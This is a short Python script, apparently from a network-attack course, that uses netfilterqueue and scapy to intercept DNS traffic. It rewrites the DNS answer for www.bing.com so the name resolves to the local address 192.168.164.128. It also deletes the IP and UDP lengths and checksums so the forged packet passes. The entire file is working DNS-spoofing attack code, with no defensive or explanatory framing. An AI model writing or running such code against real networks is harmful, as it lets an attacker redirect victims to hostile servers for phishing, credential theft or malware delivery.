#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if 'www.bing.com' in qname:
            print(scapy_packet.show())
            # create  answer
            answer = scapy.DNSRR(rrname=qname, rdata='192.168.164.128')
            # change response  being sent to answer
            scapy_packet[scapy.DNS].an = answer
            # change number of answers being sent to only one
            scapy_packet[scapy.DNS].ancount = 1
            #############################
            # len and chksum must be deleted as they are used to determine
            #   whether a packet has been modified. deleting them will cause
            #   them to be recalculated based on the modified packet
            #############################
            # deleting IP len
            del scapy_packet[scapy.IP].len
            # deleting IP chksum
            del scapy_packet[scapy.IP].chksum
            # deleting UDP len
            del scapy_packet[scapy.UDP].len
            # deleting UDP chksum
            del scapy_packet[scapy.UDP].chksum
            # change packet being forwarded to our modified packet
            packet.set_payload(str(scapy_packet))

    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()